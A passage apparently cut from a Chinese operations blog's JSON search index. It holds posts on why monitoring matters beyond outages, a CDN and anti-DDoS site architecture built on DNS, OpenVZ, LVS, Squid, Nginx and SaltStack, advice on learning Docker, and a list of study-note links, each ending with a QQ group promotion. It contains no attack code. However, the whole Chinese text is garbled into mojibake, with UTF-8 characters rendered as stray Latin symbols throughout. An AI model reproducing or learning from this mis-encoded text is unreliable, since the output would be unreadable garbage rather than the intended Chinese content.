â€œè¿™æœ‰ä¸€ä¸ªé—®é¢˜â€ï¼Œå®ƒä¹Ÿè¦å¸®åŠ©ä½ æ’æŸ¥é—®é¢˜å‡ºç°çš„åŸå› ,ä½ ä¸åªæ˜¯æƒ³åœ¨æœåŠ¡å˜æ…¢çš„æ—¶å€™æ”¶åˆ°æŠ¥è­¦ï¼Œä½ å…¶å®æƒ³çŸ¥é“è¿‡å»å‡ å°æ—¶æµé‡æ˜¯å¦å¢åŠ äº†ï¼Œæœºå™¨æ˜¯ä¸æ˜¯å®•æœºäº†ï¼Œåç«¯æœåŠ¡å™¨æ˜¯ä¸æ˜¯å˜æ…¢äº†æˆ–è€…å†…éƒ¨æ‰§è¡Œæ—¶é—´å˜é•¿äº†ã€‚ åœ¨ä½ çš„åº”ç”¨ä¸­é›†æˆç›‘æ§æ¨¡å— åšä¸ºæŠ¥è­¦å’Œæ’é”™é‡è¦æ‰‹æ®µï¼Œç›‘æ§è¦åœ¨ä½ çš„æ¶æ„ä½“ç³»ä¸­æ‹¥æœ‰æ ¸å¿ƒä½ç½®ã€‚è¦é›†æˆç›‘æ§å·¥å…·åœ¨ä½ çš„æ‰€æœ‰ä»£ç é€»è¾‘ä¸­ï¼Œè€Œä¸ä»…ä»…æ˜¯åœ¨è¾¹ç¼˜åŒºåŸŸæ·»åŠ ä¸€ç‚¹ã€‚è·Ÿè¸ªæ¯ä¸ªè¯·æ±‚æäº¤apiéœ€è¦å¤šå°‘ç»„ä»¶ï¼Œä»¥ä¾¿ä½ åœ¨è®¾è®¡æ–°çš„å­˜å‚¨ç³»ç»Ÿæ˜¯å¦èƒ½å¤ŸçŸ¥é“è¦å¤„ç†å¤šå°‘æ•°æ®ï¼Œè·Ÿè¸ªå†…å­˜çš„å‘½ä¸­ç‡ï¼Œä»¥ä¾¿ä½ èƒ½åº¦é‡å®ƒä»¬éšç€æµé‡æ¨¡å¼å˜åŒ–çš„è§„å¾‹ï¼Œç”šè‡³åˆ†è§£åˆ°memcachedä¸­æ¥èŠ‚çœå†…å­˜å’Œæé«˜å‘½ä¸­ç‡ã€‚è·Ÿè¸ªç”¨æˆ·å‘½ä¸­ä½ çš„ä¸šåŠ¡é€»è¾‘çš„â€æ…¢è·¯å¾„â€œï¼Œä»¥ä¾¿ä½ çŸ¥é“å®ƒä»€ä¹ˆæ—¶å€™å¯ä»¥æ›´å¿«ï¼Œå¹¶ä¸”å½“æ–°çš„åŠŸèƒ½ä½¿ç”¨â€æ…¢è·¯å¾„â€œçš„æ—¶å€™ï¼Œä½ å·²ç»å‡†å¤‡å¥½äº†è®©å®ƒâ€å»¶è¿Ÿå‘½ä¸­â€œã€‚åœ¨ä½ çš„ä»£ç å†…éƒ¨ï¼Œåšè¿™æ ·å¤§é‡çš„ç»†èŠ‚å·¥ä½œï¼Œå¯ä»¥è®©ä½ å‰è¿›çš„æ›´å¿«ï¼ŒæŠ€æœ¯å’Œäº§å“å†³ç­–ä¼šå—ç›Šè‰¯å¤šï¼Œæ ¹æœ¬ä¸Šæå‡äº†ä½ çš„æ•ˆç‡ã€‚è¿™å°±æ˜¯ç›‘æ§çš„æ„ä¹‰æ‰€åœ¨ï¼Œç›‘æ§ä¸åªæ˜¯ä¸ºäº†å¤„ç†æ•…éšœã€‚ åŸæ–‡ https://www.robustperception.io/monitoring-not-just-for-outages/ äº¤æµå­¦ä¹ ï¼šğŸ§ Linux shell_é«˜çº§è¿ç»´æ´¾: 459096184 åœˆå­ (ç³»ç»Ÿè¿ç»´-åº”ç”¨è¿ç»´-è‡ªåŠ¨åŒ–è¿ç»´-è™šæ‹ŸåŒ–æŠ€æœ¯ç ”ç©¶æ¬¢è¿åŠ å…¥)ğŸ§ BigData-Exchange School : 521621407 åœˆå­ï¼ˆå¤§æ•°æ®è¿ç»´)ï¼ˆHadoopå¼€å‘äººå‘˜)ï¼ˆå¤§æ•°æ®ç ”ç©¶çˆ±å¥½è€…) æ¬¢è¿åŠ å…¥ ç›¸åº”Bidataæœ‰å†…éƒ¨å¾®ä¿¡äº¤æµç¾¤äº’ç›¸å­¦ä¹ ï¼ŒåŠ å…¥QQç¾¤æœ‰é“¾æ¥ã€‚","link":"/2017/04/05/è¿ç»´ç¬”è®°/ã€ç¿»è¯‘ã€‘ç›‘æ§ä¸åªæ˜¯ä¸ºäº†å¤„ç†æ•…éšœ/"},{"title":"CDNåŠ é€ŸåŠ©åŠ›é«˜å¹¶å‘ç½‘ç«™æ¶æ„","text":"CDNåŠ é€ŸåŠ©åŠ›é«˜å¹¶å‘ç½‘ç«™æ¶æ„ æ¶æ„è¯´æ˜ï¼šç”¨æˆ·é€šè¿‡äº’è”ç½‘è®¿é—®ç½‘ç«™éœ€è¦ç»è¿‡çš„èŠ‚ç‚¹å¦‚ä¸‹ï¼š ä¸€ã€è¦é€šè¿‡åŸŸåè§£æåœ¨åŸŸåè§£æå¤„æœ‰ä¸¤ç§æ–¹å¼1ã€è‡ªå»ºï¼Œè‡ªå»ºéœ€è¦åœ¨åŸŸåè§£æå‰æ¶è®¾é˜²ç«å¢™ã€‚ 2ã€ä½¿ç”¨ç°æœ‰çš„åŸŸåè§£ææä¾›å•†ï¼Œéœ€è¦è®¾ç½®æˆCNAME,å…¶å®å°±æ˜¯å¦ä¸€ä¸ªåŸŸåè§£æï¼Œè¿›è¡Œè·³è½¬ã€‚åœ¨åˆšå¼€å§‹çš„æ—¶å€™å»ºè®®å…ˆç”¨CNAMEæ–¹å¼ï¼Œéƒ¨ç½²ä¸å½±å“ç”¨æˆ·ç°æœ‰æ–¹å¼ï¼Œå®¹æ˜“è¢«ç”¨æˆ·æ¥å—ï¼Œè€Œä¸”ä¸ç”¨æš‚æ—¶ä¸ç”¨æ‹…å¿ƒç¬¬ä¸€çº§dnsçš„é—®é¢˜ã€‚ æ€»ä¹‹ï¼Œå¦‚æœè¦å»ºè®¾idcåŠ é€Ÿï¼Œé˜²æ­¢ddosæ”»å‡»ä¹‹ç±»çš„æœåŠ¡ï¼ŒåŸŸåè§£ææœåŠ¡ä¸€å®šè¦æä¾›ï¼Œä¸ç®¡æ˜¯ç›´æ¥æä¾›dnsæœåŠ¡è¿˜æ˜¯é—´æ¥é€šè¿‡cnameè½¬å‘ã€‚é‡Œé¢çš„ä¸»è¦æŠ€æœ¯ï¼Œæ˜¯é€šè¿‡ç”¨æˆ·è¯·æ±‚çš„ipæ¥å¾—åˆ°ç¦»ç”¨æˆ·æœ€è¿‘çš„æœåŠ¡å™¨çš„åœ°å€ï¼Œå¹¶é€šè¿‡å®ƒæ¥æä¾›æœåŠ¡ã€‚å¦‚æœè¦è¿›è¡Œå®‰å…¨é˜²æŠ¤ï¼Œæ¯”å¦‚sqlæ³¨å…¥æ£€æŸ¥ï¼Œjsè·¨ç«™è„šæœ¬ç­‰å¯ä»¥åœ¨è¿™ä¸€å±‚è¿›è¡Œå¤„ç†ã€‚ äºŒã€æä¾›è™šæ‹Ÿæœºè™šæ‹Ÿæœºç°åœ¨ä¸»æµæœ‰ä¸¤ç§æ–¹å¼ï¼Œä¸€æ˜¯è™šæ‹Ÿä¸»æœºï¼Œä¸»è¦çš„è½¯ä»¶æœ‰å¼€æºçš„openvzï¼Œå•†ç”¨çš„Virtuozzoç­‰,å¦ä¸€ç±»æ˜¯è™šæ‹Ÿæœºå¦‚vmwareã€xenã€kvmç­‰ï¼Œè¿™ç±»æä¾›è™šæ‹Ÿæ“ä½œç³»ç»Ÿï¼Œå¯ä»¥æ˜¯å¼‚æ„çš„ã€‚ä»–ä»¬ä¸¤ä¸ªçš„å¯¹æ¯”ä¸»è¦æ˜¯è™šæ‹Ÿä¸»æœºçš„åˆ©ç”¨ç‡æ¯”è¾ƒé«˜ï¼Œå¯ä»¥ä¸€å°ä¸»æµpcserverå¯ä»¥è™šæ‹Ÿå‡ åä¸ªåˆ°ä¸Šç™¾ä¸ªè™šæ‹Ÿä¸»æœºï¼Œä½†åªèƒ½æ˜¯åŒä¸€ç±»æ“ä½œç³»ç»Ÿã€‚è™šæ‹Ÿæœºçš„è¿è¡Œæ•ˆç‡ç›¸å¯¹ä½å¾ˆå¤šï¼Œä¸€èˆ¬ä¸»æµpcserverä¹Ÿå°±åå‡ ä¸ªå·¦å³ã€‚ä»–çš„æœ‰ç‚¹æ˜¯å¼‚æ„æ“ä½œç³»ç»Ÿï¼Œå¤‡ä»½ç®¡ç†æ¯”è¾ƒæ–¹ä¾¿ã€‚å½“ç„¶åœ¨å»ºè®¾çš„æ—¶å€™å¯ä»¥å…ˆç”¨è™šæ‹Ÿæœºï¼Œç„¶ååœ¨è™šæ‹Ÿæœºä¸Šå»ºè®¾è™šæ‹Ÿä¸»æœºã€‚ å¦‚æœè¦æä¾›å¯¹å¤–æœåŠ¡ï¼Œipåœ°å€æ˜¯æ¯”ä¸å¯å°‘çš„ï¼Œå¯¹äºä¸€ä¸ªç”¨æˆ·æ¥è¯´ï¼Œä¸€ä¸ªåŸŸåéœ€è¦å‡ ä¸ªç‚¹ï¼Œå°±éœ€è¦å‡ ä¸ªipã€‚ ä¸‰ã€LVSé›†ç¾¤ç”±äºè¦æä¾›åŠ é€Ÿç­‰æœåŠ¡ï¼Œç”¨æˆ·ç›´æ¥ä½¿ç”¨çš„openvzè™šæ‹Ÿä¸»æœºçš„æ€§èƒ½å’Œæ•ˆç‡ä¸€èˆ¬ä¸å¤§ï¼Œåˆè¦æä¾›é«˜å¯ç”¨æ€§ï¼Œæ‰€ä»¥éœ€è¦é€šè¿‡è™šæ‹Ÿä¸»æœºè®¿é—®lvsé›†ç¾¤çš„æ•°æ®ï¼Œé€šè¿‡lvsé›†ç¾¤æ¥æä¾›æœåŠ¡ã€‚ å››ã€SquidSquidæ˜¯ç¼“å­˜ï¼Œå°¤å…¶æ˜¯å¯¹é™æ€é¡µé¢å’Œæ–‡ä»¶æœ‰å¾ˆå¥½åŠ é€Ÿæ•ˆæœã€‚sinaã€sohuç­‰éƒ½ç”¨å®ƒæ¥åšç¼“å­˜åŠ é€Ÿã€‚ äº”ã€Nginxâ€‹Nginxä¸»è¦æä¾›åå‘ä»£ç†åŠŸèƒ½ï¼Œå½“é€šè¿‡ä¿®æ”¹æˆ–è€…æ›´æ–°äº†é¡µé¢ï¼Œç”±nginxæ¥è´Ÿè´£æ›´æ–°ç¼“å­˜ã€‚è¿˜æœ‰å°±æ˜¯åŠ¨æ€ç½‘ç«™ï¼Œä¹Ÿæ˜¯ç”±nginxæ¥æä¾›æœåŠ¡ã€‚ Nginxå’Œsqidéƒ½å¯ä»¥æä¾›é™æ€ç¼“å­˜åŠŸèƒ½ï¼Œä¸¤è€…è¿˜è¦ç»“åˆèµ·æ¥å‘æŒ¥æœ€å¤§æ•ˆæœã€‚å¦‚æœè¦è¿›è¡Œå®‰å…¨é˜²æŠ¤ï¼Œæ¯”å¦‚sqlæ³¨å…¥æ£€æŸ¥ï¼Œjsè·¨ç«™è„šæœ¬ç­‰å¯ä»¥åœ¨è¿™ä¸€å±‚è¿›è¡Œå¤„ç†ã€‚é˜²DDOS å…­ã€è‡ªåŠ¨åŒ–å·¥å…·+Dockerè¿è¡ŒSaltstask è‡ªåŠ¨åŒ–å·¥å…·æ‰¹é‡åˆå§‹åŒ–è„šæœ¬æ›´æ–°ç›‘æ§è„šæœ¬ï¼Œå¢åˆ æ”¹æŸ¥æ·»åŠ ç¼“å­˜æœºåˆ¶ã€‚ä¸Šç™¾å°æœåŠ¡å™¨èŠ‚çœæˆ‘ä»¬æ“ä½œæ—¶é—´ï¼Œç‰©ç†æœºè¿è¡ŒDockerç¨‹åºã€‚ é˜²ddosçš„ä¸»è¦å†…å®¹ç”±ä¸¤ä¸ªæ–¹é¢ï¼šä¸€ã€å¸¦å®½è¿™ä¸ªæ˜¯å¾ˆé‡è¦çš„åœ°æ–¹ï¼Œæ®æˆ‘ç°åœ¨ä»ç½‘ä¸Šå¾—åˆ°çš„èµ„æ–™ï¼Œç°åœ¨ä¸»æµçš„idcæœºæˆ¿ä¸€èˆ¬æœ€å¤§æä¾›ç‹¬ç«‹ç™¾å…†ç«¯å£ï¼Œè€Œä¸”ä»·æ ¼ä¸è²ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹å¯ä»¥æœºæŸœç§Ÿç”¨ã€‚è¿™ä¸ªè¿˜éœ€è¦è°ƒç ”æ˜¯å¦å¯ä»¥æä¾›æ›´å¤§çš„å¸¦å®½ã€‚ äºŒã€é˜²ç«å¢™è®¾å¤‡éœ€è¦åœ¨æ¥å…¥å£éƒ¨ç½²é˜²ç«å¢™ï¼Œéœ€è¦æ ¹æ®idcæ¥å£ç«¯å£æ¥ç¡®å®šå®¹é‡ï¼Œæœ‰çš„idcæœºæˆ¿ä¹Ÿæä¾›æ­¤æœåŠ¡ã€‚ ä¸‰ã€æµé‡ç‰µå¼•è®¾å¤‡è¿™ä¸ªä¸€èˆ¬idcæœºæˆ¿ä¼šæä¾›æ­¤æœåŠ¡ï¼Œè¿™ä¸ªæ ¹æ®éœ€è¦æ˜¯å¦éœ€è¦è´­ä¹°ã€‚ äº¤æµå­¦ä¹ ï¼šğŸ§ Linux shell_é«˜çº§è¿ç»´æ´¾: 459096184 åœˆå­ (ç³»ç»Ÿè¿ç»´-åº”ç”¨è¿ç»´-è‡ªåŠ¨åŒ–è¿ç»´-è™šæ‹ŸåŒ–æŠ€æœ¯ç ”ç©¶æ¬¢è¿åŠ å…¥)ğŸ§ BigData-Exchange School : 521621407 åœˆå­ï¼ˆå¤§æ•°æ®è¿ç»´)ï¼ˆHadoopå¼€å‘äººå‘˜)ï¼ˆå¤§æ•°æ®ç ”ç©¶çˆ±å¥½è€…) æ¬¢è¿åŠ å…¥ ç›¸åº”Bidataæœ‰å†…éƒ¨å¾®ä¿¡äº¤æµç¾¤äº’ç›¸å­¦ä¹ ï¼ŒåŠ å…¥QQç¾¤æœ‰é“¾æ¥ã€‚","link":"/2015/07/23/è¿ç»´ç¬”è®°/CDNåŠ é€ŸåŠ©åŠ›é«˜å¹¶å‘ç½‘ç«™æ¶æ„/"},{"title":"ä¸ªäººæ€»ç»“ï¼šä¸ºä»€è¦å­¦ä¹ dockerï¼Œå¦‚ä½•å­¦ä¹ Docker","text":"å­¦ä¹ ä»»ä½•ä¸€ä¸ªå¼€æºæ–°æŠ€æœ¯ï¼Œé¦–å…ˆé—®è‡ªå·±å‡ ä¸ªé—®é¢˜ï¼š 1. ä¸ºä»€è¦å­¦ä¹ å®ƒï¼Ÿ2. å­¦ä¹ å®ƒéœ€è¦äº†è§£å“ªäº›ç›¸å…³çŸ¥è¯†ç‚¹ï¼Ÿ3. å¦‚ä½•å¿«é€Ÿå­¦ä¹ ï¼Ÿ4. è¯¥æŠ€æœ¯çš„ä½¿ç”¨åœºæ™¯æ˜¯ä»€ä¹ˆï¼Ÿæ‹¿æˆ‘ä¸ªäººçš„å­¦ä¹ ç»éªŒæ¥ä¸¾ä¾‹ï¼ˆæœ¬äººä¹‹å‰æ¯”è¾ƒäº†è§£KVMï¼ŒESxi,OpenStackï¼‰ ä¸ºä»€è¦å­¦ä¹ dockerï¼Ÿä¸ªäººå›ç­”ï¼š 1234567dockeræ˜¯è½»é‡çº§è™šæ‹ŸåŒ–æŠ€æœ¯ï¼Œdockerä½¿linuxå®¹å™¨æŠ€æœ¯çš„åº”ç”¨æ›´åŠ ç®€å•å’Œæ ‡å‡†åŒ–dockerçš„é€Ÿåº¦å¾ˆå¿«,å®¹å™¨å¯åŠ¨æ—¶æ¯«ç§’çº§çš„dockerå°†å¼€å‘å’Œè¿ç»´èŒè´£åˆ†æ¸…dockerè§£å†³äº†ä¾èµ–åœ°ç‹±é—®é¢˜dockeræ”¯æŒå‡ ä¹æ‰€æœ‰æ“ä½œç³»ç»Ÿdockeræœ‰ç€é£é€Ÿå‘å±•çš„ç”Ÿæ€åœˆå¾ˆå¤šITå·¨å¤´é€æ¸åŠ å…¥å’Œæ”¯æŒ å­¦ä¹ å®ƒéœ€è¦äº†è§£å“ªäº›ç›¸å…³çŸ¥è¯†ç‚¹ï¼Ÿ å›ç­”ï¼š 123456789äº‘è®¡ç®—æ¦‚å¿µç›¸å…³ï¼ˆrestapi, å¾®æœåŠ¡ï¼ŒOpenStackï¼‰Linux ç³»ç»Ÿç®¡ç†ï¼ˆè½¯ä»¶åŒ…ç®¡ç†ï¼Œç”¨æˆ·ç®¡ç†ï¼Œè¿›ç¨‹ç®¡ç†ç­‰ï¼‰Linux å†…æ ¸ç›¸å…³ï¼ˆCgroup, namespace ç­‰ï¼‰Linux æ–‡ä»¶ç³»ç»Ÿå’Œå­˜å‚¨ç›¸å…³ï¼ˆAUFSï¼ŒBRFS,devicemapper ç­‰ï¼‰Linux ç½‘ç»œï¼ˆç½‘æ¡¥ï¼Œveth,iptablesç­‰ï¼‰Linuxå®‰å…¨ç›¸å…³ï¼ˆAppmor,Selinux ç­‰ï¼‰Linuxè¿›ç¨‹ç®¡ç†ï¼ˆSupervisord,Systemd etc)Linuxå®¹å™¨æŠ€æœ¯ï¼ˆLXCç­‰ï¼‰å¼€å‘è¯­è¨€ï¼ˆPython, GO,Shell ç­‰ï¼‰ 3.å¦‚ä½•å¿«é€Ÿå­¦ä¹ ï¼Ÿ 1234å›ç­”ï¼šä¸ªäººä½“ä¼šæœ€å¥½æœ‰ä¸€ä¸ªå®é™…çš„éœ€æ±‚æˆ–é¡¹ç›®æ¥è¾¹å®è·µè¾¹å­¦ä¹ ï¼Œå…¥é—¨å¯ä»¥å‚è€ƒï¼ˆç¬¬ä¸€æœ¬dockerä¹¦ï¼‰å†™çš„ä¸é”™ï¼Œéå¸¸é€‚åˆå…¥é—¨ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œé˜…è¯»ç‰›äººçš„blogæ¯”å¦‚å®˜æ–¹blog http://blog.docker.com/ æœ€åï¼Œå‚ä¸ç¤¾åŒºäº’åŠ¨ä¹Ÿæ˜¯å¾ˆå¥½çš„å­¦ä¹ æ–¹å¼ã€‚ è¯¥æŠ€æœ¯çš„ä½¿ç”¨åœºæ™¯æ˜¯ä»€ä¹ˆï¼Ÿå›ç­”ï¼šdockeréå¸¸é€‚ç”¨äºdev/test CI/CD åœºæ™¯ï¼Œç”¨å®Œå°±æ‰”ã€‚è¿˜æœ‰å°±æ˜¯PasSäº†ã€‚ ä¸ºä»€è¦å­¦ä¹ Docker 1.å­¦ä¹ Dockerï¼Œå¦‚æœæ²¡æœ‰äº‘è®¡ç®—çš„åŸºæœ¬çŸ¥è¯†ï¼Œä»¥åŠå†…æ ¸çš„åŸºæœ¬çŸ¥è¯†ï¼Œé‚£ä¹ˆå­¦ä¹ å¹¶ç†è§£èµ·æ¥ä¼šç¨åƒåŠ›ã€‚ä½œä¸ºå®¹å™¨ï¼ŒDockerå®¹å™¨çš„ä¼˜åŠ¿åœ¨å“ªï¼Œä¸è¶³åœ¨å“ªï¼Œæœ€å¥½äº†è§£å®¹å™¨çš„å®ç°æ˜¯æ€æ ·çš„ï¼ˆç®€å•äº†è§£ï¼‰ï¼›æ‹¥æœ‰é•œåƒç®¡ç†ï¼ŒDockeråˆè¯¥å¦‚ä½•ä½“ç°è½¯ä»¶å¼€å‘ï¼Œé›†æˆï¼Œéƒ¨ç½²ï¼Œå‘å¸ƒï¼Œå†è¿­ä»£çš„è½¯ä»¶ç”Ÿå‘½å‘¨æœŸç®¡ç†ä¼˜åŠ¿ã€‚ä»¥ä¸Šä¸¤ç‚¹æˆ‘è®¤ä¸ºæœ€ä¸ºå…³é”®ï¼Œæœ‰è¿™ä¸¤æ–¹é¢çš„è®¤è¯†åŠ¿å¿…ä¼šå¯¹ä¹‹åçš„å·¥ä½œå¸®åŠ©å·¨å¤§ã€‚ 2.å…³äºå­¦ä¹ èµ„æºï¼Œèµ·ç çš„ç¡¬ä»¶è®¾æ–½æ€»æ˜¯è¦æœ‰çš„ã€‚DockeråŠå…¶ç”Ÿæ€çš„å‘å±•å¾ˆå¿«ï¼Œä¸ä½¿ç”¨çº¯ç†è®ºè‚¯å®šæ”¶æ•ˆç”šå¾®ã€‚å¦å¤–ï¼Œèµ„æºè¿˜åŒ…æ‹¬Dockerå®˜æ–¹ï¼Œå„å¤§ç”µå­åª’ä½“å¹³å°ï¼ŒæŠ€æœ¯è®ºå›ï¼Œå¼€æºç¤¾åŒºç­‰ï¼Œå¾€å¾€å¤§æ‹¿çš„è§‚ç‚¹èƒ½ç‚¹ç ´è‡ªå·±çš„å›°æƒ‘ï¼Œæˆ–è€…è®©è‡ªå·±çŸ¥é“å“ªæ–¹é¢çš„è®¤è¯†è¿˜å¾ˆæ¬ ç¼ºï¼Œä»¥åŠè®©è‡ªå·±å°‘èµ°å¾ˆå¤šçš„å¼¯è·¯ã€‚ 3.ä¸ªäººå…´è¶£çš„è¯ï¼Œå½’ç»“ä¸ºå¼ºæ‰­çš„ç“œä¸ç”œã€‚èµ·ç åº”è¯¥è®¤åŒDockerçš„è®¾è®¡ä»·å€¼ï¼Œä»¥åŠDockerçš„æœªæ¥æ½œåŠ›ï¼Œå½“ç„¶æœ‰ä¾æ®çš„æ‰¹åˆ¤Dockerå¹¶å¸¦åŠ¨å¤§å®¶çš„æ€è€ƒï¼Œä¹Ÿæ˜¯æ·±åˆ‡å…³æ³¨çš„è¡¨ç°ã€‚ 4.ä¸ªäººå‘å±•æ–¹å‘ï¼Œæˆ‘è®¤ä¸ºå¦‚æœéœ€è¦æŠŠDockerå½“ä½œè½¯ä»¶ç”Ÿå‘½å‘¨æœŸç®¡ç†å·¥å…·çš„è¯ï¼Œé‚£ç”¨å¥½Dockeræœ€ä¸ºé‡è¦ï¼ŒAPIåŠå‘½ä»¤çš„ç†è§£ä¸ä½¿ç”¨æ˜¯å¿…éœ€çš„ã€‚å¦‚æœä¸“æ³¨ç³»ç»Ÿè®¾è®¡æ–¹é¢ï¼Œé‚£ä¹ˆé™¤Dockerä»¥ä¸Šçš„çŸ¥è¯†ä¸ç»éªŒä¹‹å¤–ï¼Œè‹¥æœ‰Dockeræºç çš„å­¦ä¹ ä¸ç†è§£ï¼Œé‚£ä¹ˆè¿™äº›è‚¯å®šä¼šè®©ä½ çš„Dockeræ°´å¹³æé«˜ä¸€ä¸ªå±‚æ¬¡ã€‚ å­¦ä¹ Dockerï¼Œæœ€å¤§çš„å¥½å¤„æ˜¯è·Ÿè¿›æ–°æŠ€æœ¯å‘å±•æ–¹å‘ã€‚æˆ‘è§‰å¾—åœ¨æ ¡ç”Ÿåº”è¯¥æ²¡æœ‰å¤šå°‘ç¡¬æ€§éœ€æ±‚åœ¨Dockerçš„ç ”ç©¶ä¸Šï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆå­¦æ ¡æ²¡åšå…·ä½“åº”ç”¨è¦æ±‚çš„åŸå› ã€‚æœ€å®é™…çš„åšæ³•æ˜¯çœ‹ä¸€äº›Dockerä½¿ç”¨æ¡ˆä¾‹ï¼Œè‡ªå·±å®è·µå‡ºä¸€äº›ç»éªŒåº”è¯¥ä¼šå†ä»¥åçš„ç¤¾ä¼šå®è·µä¸­èµ·åˆ°ä½œç”¨ã€‚ ç ”ç©¶dockerçš„æºä»£ç ï¼Œåº”è¯¥åˆ°ä½ ä¸‹å®šå†³å¿ƒä»äº‹äº‘è®¡ç®—æ–¹é¢çš„äº‹ä¸šæˆ–è€…ç ”ç©¶ï¼Œé‚£ä¹ˆä½ å°±éœ€è¦ä»¥ç ”ç©¶è€…çš„èº«ä»½å»åšä»”ç»†çš„æºç åˆ†æçš„å·¥ä½œã€‚ Dockerç«èµ·æ¥çš„çœŸæ­£åŸå› æ˜¯ä»€ä¹ˆï¼Ÿæˆ‘è®¤ä¸ºæœ‰è¿™ä¹ˆå‡ ç‚¹ï¼Œ 123æ™®é€šå¼€å‘è€…æœ‰æœºä¼šæ¥è§¦å®¹å™¨æŠ€æœ¯ï¼Œäº«å—å¼€å‘å‘å¸ƒä¸€ä½“åŒ–çš„ä¾¿åˆ©ã€‚å®¹å™¨äº‘æ˜¯åŒºåˆ«äºä¼ ç»ŸIaaSæœåŠ¡çš„å¦ä¸€ç§æ›´å¿«é€Ÿæ›´é«˜æ•ˆçš„è½»é‡çº§é€‰æ‹©ã€‚åŸºäºé•œåƒçš„ç¬¬äºŒä¸ªGitHubã€CI/CDæœåŠ¡ã€ä»£ç å‘å¸ƒã€åœ¨çº¿debugã€‚ äº¤æµå­¦ä¹ ï¼šğŸ§ Linux shell_é«˜çº§è¿ç»´æ´¾: 459096184 åœˆå­ (ç³»ç»Ÿè¿ç»´-åº”ç”¨è¿ç»´-è‡ªåŠ¨åŒ–è¿ç»´-è™šæ‹ŸåŒ–æŠ€æœ¯ç ”ç©¶æ¬¢è¿åŠ å…¥)ğŸ§ BigData-Exchange School : 521621407 åœˆå­ï¼ˆå¤§æ•°æ®è¿ç»´)ï¼ˆHadoopå¼€å‘äººå‘˜)ï¼ˆå¤§æ•°æ®ç ”ç©¶çˆ±å¥½è€…) æ¬¢è¿åŠ å…¥ ç›¸åº”Bidataæœ‰å†…éƒ¨å¾®ä¿¡äº¤æµç¾¤äº’ç›¸å­¦ä¹ ï¼ŒåŠ å…¥QQç¾¤æœ‰é“¾æ¥ã€‚","link":"/2016/10/10/è¿ç»´ç¬”è®°/ä¸ªäººæ€»ç»“ï¼šä¸ºä»€è¦å­¦ä¹ dockerï¼Œå¦‚ä½•å­¦ä¹ Docker/"},{"title":"ä¸ªäººè®°å½•ğŸ’¥-èµ°ä¸Šå…¨æ ˆè¿ç»´å·¥ç¨‹å¸ˆå­¦ä¹ ç¬”è®°","text":"ä¸ªäººè¿ç»´ğŸ’¥å­¦ä¹ ç¬”è®°ï¼š1234567ä»2014å¹´åˆå°±å¼€å§‹æ…¢æ…¢è®°å½•è‡ªå·±æ‰€æ¥è§¦å’Œå­¦ä¹ åˆ°çš„ä¸œè¥¿ï¼Œæ…¢æ…¢çš„ç§¯ç´¯ï¼Œæ•´ç†å‡ºå¾ˆå¤šå­¦ä¹ çš„å¥½æ–‡ç« ï¼Œåœ¨è¿™é‡Œæˆ‘å¹¶ä¸”è®°å½•ä¸‹æ¥ã€‚è¿™æ˜¯æˆ‘ç°åœ¨ç»´æŠ¤çš„ä¸ªäººç¬”è®°åº“å’Œåšå®¢ä¸åŒï¼Œå®ƒä»¬å¤§å¤šéƒ½ä¸æ˜¯ç›´æ¥æ¥æºäºæˆ‘çš„åŸåˆ›ï¼Œè€Œæ˜¯æˆ‘ä¸€è¾¹é˜…è¯»ä¸€è¾¹æ•´ç†åŠ å·¥è€Œæˆçš„ç¬”è®°åˆ—è¡¨.æˆ‘çš„ç›®çš„æ˜¯å°†é›¶æ•£çš„çŸ¥è¯†ç‚¹æ”¾åœ¨ä¸€ä¸ªé›†ä¸­çš„åœ°æ–¹. ç¬¬ä¸€ï¼šæ–¹ä¾¿æˆ‘è‡ªå·±æŸ¥çœ‹å’Œå­¦ä¹ ï¼Œå¯ä»¥æ›´å¥½çš„æ‰¾åˆ°æˆ‘æƒ³è¦çš„æ–‡æ¡£ã€‚ ç¬¬äºŒï¼šå¯ä»¥ç»™è‡ªå·±å­¦ä¹ ç»“æœæ¯å¹´åšä¸€ä¸ªæ€»ç»“ã€‚ æ¯3ä¸ªæœˆéƒ½ä¼šæ›´æ–°è®°å½•ã€‚ äº¤æµå­¦ä¹ ï¼šğŸ§ Linux shell_é«˜çº§è¿ç»´æ´¾: 459096184 åœˆå­ (ç³»ç»Ÿè¿ç»´-åº”ç”¨è¿ç»´-è‡ªåŠ¨åŒ–è¿ç»´-è™šæ‹ŸåŒ–æŠ€æœ¯ç ”ç©¶æ¬¢è¿åŠ å…¥)ğŸ§ BigData-Exchange School : 521621407 åœˆå­ï¼ˆå¤§æ•°æ®è¿ç»´)ï¼ˆHadoopå¼€å‘äººå‘˜)ï¼ˆå¤§æ•°æ®ç ”ç©¶çˆ±å¥½è€…) æ¬¢è¿åŠ å…¥ ç›¸åº”Bidataæœ‰å†…éƒ¨å¾®ä¿¡äº¤æµç¾¤äº’ç›¸å­¦ä¹ ï¼ŒåŠ å…¥QQç¾¤æœ‰é“¾æ¥ã€‚ Linux ç³»ç»ŸCentosæº centosæºç åŒ…æ›´æ–°ä¸‹è½½åœ°å€ centos é•œåƒä¸‹è½½åœ°å€ ç¡¬ç›˜åˆ†åŒº æ ¼å¼åŒ–çš„ext4é‡è¶…è¿‡16TBçš„é™åˆ¶(1) æ ¼å¼åŒ–çš„ext4é‡è¶…è¿‡16TBçš„é™åˆ¶(2) FileZilla filezillaä¸‹è½½åœ°å€ PXE pxe æ— äººå€¼å®ˆå®‰è£…æ“ä½œç³»ç»Ÿ PXE å®‰è£… YUMåº“ è‡ªåŠ¨åŒ–éƒ¨ç½²-æ­å»ºYUMä»“åº“ rpm å®šåˆ¶åŒ–RPMåŒ… DNS DNSåŸŸåè§£æåŸç† å¼€æºepel å¼€æºepelä¸‹è½½åŒ… å¼€æºç«™ç‚¹ linux_epel rpm-epelåŒ… epel rpmè½¯ä»¶åŒ… samba sambaé…ç½®æ–¹æ³• iperf ä½¿ç”¨iperfæ£€æµ‹ä¸»æœºé—´ç½‘ç»œå¸¦å®½ è™šæ‹ŸåŒ–Docker Docker å‘½ä»¤å­¦ä¹  Dockeræ“ä½œä½¿ç”¨ Docker å…¥é—¨å­¦ä¹  Docker å…¥é—¨ä¹‹æˆ˜ç”µå­ä¹¦ Dockerå®æˆ˜ï¼ˆ1)-(15) SSHè¿œç¨‹ç™»é™†dockerå®¹å™¨ éƒ¨ç½²Jenkins+dockeré›†æˆç¯å¢ƒ Esxi vsphereå®¢æˆ·ç«¯ä¸‹è½½ vsphere 